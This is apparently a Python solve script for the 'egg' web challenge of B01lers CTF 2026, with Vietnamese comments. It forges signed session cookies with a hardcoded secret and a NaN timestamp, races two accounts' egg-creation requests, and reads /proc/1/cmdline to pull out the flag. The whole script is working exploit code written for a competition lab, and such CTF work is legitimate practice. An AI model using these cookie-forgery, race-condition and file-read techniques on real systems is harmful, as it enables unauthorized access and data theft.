#!/usr/bin/env python3
"""
B01lers CTF 2026 - egg (web)
Exploit: forge cookie với session_timestamp = NaN để cố định egg_id,
race 2 account A/B trên POST /eggs để mix DB ownership với file payload,
hatch để đọc /proc/1/cmdline (flag được truyền qua argv).

Usage:
    python3 solve.py --base http://CHALL_HOST:8000
    python3 solve.py --base http://127.0.0.1:8000 --leak-path /proc/1/cmdline
"""
import argparse, base64, concurrent.futures, hashlib, http.cookiejar, json, re, time
import urllib.error, urllib.parse, urllib.request
from itsdangerous import TimestampSigner

SECRET  = "6767676767676767"
EGG_ID  = hashlib.sha256(b"nan").hexdigest()
ART_LEN = 44


def forge_cookie(player_id):
    class FixedTS(TimestampSigner):
        def get_timestamp(self): return int(time.time())
    payload = base64.b64encode(json.dumps(
        {"player_id": player_id, "session_timestamp": float("nan")}).encode())
    return "session=" + FixedTS(SECRET).sign(payload).decode()


def login(BASE, username):
    jar = http.cookiejar.CookieJar()
    op  = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))
    body = urllib.parse.urlencode({"username": username}).encode()
    op.open(urllib.request.Request(
        BASE + "/login", data=body,
        headers={"Content-Type": "application/x-www-form-urlencoded"})).read()
    for c in jar:
        if c.name == "session":
            return json.loads(base64.b64decode(
                TimestampSigner(SECRET).unsign(c.value.encode())))["player_id"]


def post_json(url, cookie, payload):
    data = json.dumps(payload).encode()
    req  = urllib.request.Request(url, data=data, headers={
        "Cookie": cookie, "Content-Type": "application/json"})
    try:
        with urllib.request.urlopen(req, timeout=8) as r:
            return r.status, r.read().decode("utf-8", errors="replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", errors="replace")


def race_create(BASE, ca, cb, leak_path, name):
    """Bắn 8 request POST /eggs song song (4 mồi + 4 payload)."""
    with concurrent.futures.ThreadPoolExecutor(max_workers=8) as ex:
        futs = []
        for _ in range(4):
            futs.append(ex.submit(post_json, BASE + "/eggs", ca,
                                  {"name": name, "filename": "asciiart"}))
            futs.append(ex.submit(post_json, BASE + "/eggs", cb,
                                  {"name": name, "filename": leak_path}))
        for f in futs: f.result()


def hatch_for_chunk(BASE, ca, cb, art_index):
    """Hatch bằng cả 2 cookie, chỉ tin kết quả khi flash đúng = 'You hatched an egg!'"""
    for label, cookie in (("B", cb), ("A", ca)):
        _, body = post_json(f"{BASE}/eggs/{EGG_ID}/hatch", cookie,
                            {"art_index": art_index})
        flash = re.search(r'class="[^"]*banner[^"]*"[^>]*>(.*?)</div>', body, re.S)
        if not flash or re.sub(r"<[^>]+>", "", flash.group(1)).strip() != "You hatched an egg!":
            continue
        pre = re.search(r"<pre>(.*?)</pre>", body, re.S)
        if pre:
            text = pre.group(1).strip()
            if "\x00" in text or "main.py" in text or "bctf" in text:
                lines = text.split("\n")
                return label, (lines[1] if len(lines) >= 2 else text)
    return None


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--base", default="http://127.0.0.1:8000")
    ap.add_argument("--leak-path", default="/proc/1/cmdline")
    ap.add_argument("--max-tries", type=int, default=30)
    args = ap.parse_args()
    BASE = args.base

    print(f"[*] target            = {BASE}")
    print(f"[*] EGG_ID  (NaN)     = {EGG_ID}")
    print(f"[*] leak filename     = {args.leak_path}")
    print()

    pid_a = login(BASE, "attackerA")
    pid_b = login(BASE, "attackerB")
    ca = forge_cookie(pid_a); cb = forge_cookie(pid_b)
    print(f"[+] player A id       = {pid_a}")
    print(f"[+] player B id       = {pid_b}")
    print(f"[+] forged cookies with session_timestamp = NaN")

    chunks = {}
    for art_index in (0, 1):
        offset = art_index * ART_LEN
        print(f"\n=== Race + leak offset {offset} (art_index={art_index}) ===")
        for attempt in range(1, args.max_tries + 1):
            # is_valid_name cấm dấu '_' --> chỉ dùng chữ + số
            name = f"egg{attempt:04d}o{offset}"
            race_create(BASE, ca, cb, args.leak_path, name)
            res = hatch_for_chunk(BASE, ca, cb, art_index)
            if res:
                label, leak = res
                print(f"[+] WIN attempt #{attempt} (cookie={label}): {leak!r}")
                chunks[art_index] = leak
                break

        # Early-exit: nếu chunk0 đã có đủ flag thì ngưng
        partial = "".join(chunks[k] for k in sorted(chunks))
        m = re.search(r"bctf\{[^}\n\x00]+\}", partial)
        if m:
            print(f"\n[!] FLAG: {m.group(0)}")
            return 0

    full = chunks.get(0, "") + chunks.get(1, "")
    m = re.search(r"bctf\{[^}\n\x00]+\}", full)
    if m:
        print(f"\n[!] FLAG: {m.group(0)}")
        return 0
    print("[-] could not assemble flag")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
